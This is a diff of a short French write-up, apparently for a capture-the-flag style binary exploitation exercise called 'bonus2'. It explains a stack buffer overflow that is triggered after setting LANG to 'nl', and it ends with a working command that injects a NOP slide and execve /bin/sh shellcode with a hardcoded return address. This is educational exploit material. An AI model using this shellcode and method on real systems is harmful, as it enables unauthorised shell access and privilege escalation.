@@ -1,7 +1,6 @@
 On met le programme dans un décompilateur, et on voit qu'il prend deux 
 arguments. Il fait un check sur la langue, donc on choisit une valeur reconnue 
 par le programme, "nl"
-export LANG="nl"
 On fait ensuite des test avec les deux arguments, on met le premier très long 
 et le deuxième aussi. On voit que ça fait un segfault. On suppute donc que 
 l'addresse de retour de main a été écrasée. Pour tester ça, on lance le 
@@ -11,6 +10,7 @@ Il s'agit maintenant d'insérer une nop-slide et un shellcode dans le premier
 arguments, complété avec des caractères poubelles pour remplir le buffer. 
 Dans le deuxième argument, on met 23 caractères poubelles pour l'offset, suivi
 d'une addresse qui pointe vers la nop-slide située dans le buffer. 
-On obtient alors un accès bash avec les bonnes permissions. 
+On récupère l'adresse du buffer avec gdb. 
 
+export LANG="nl"
 ./bonus2 $(python -c 'print("\x90" * 10 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x89\xe1\xb0\x0b\xcd\x80" + "a" * 40)') $(python -c 'print("b" * 23 + "\xc8\xf8\xff\xbf")')
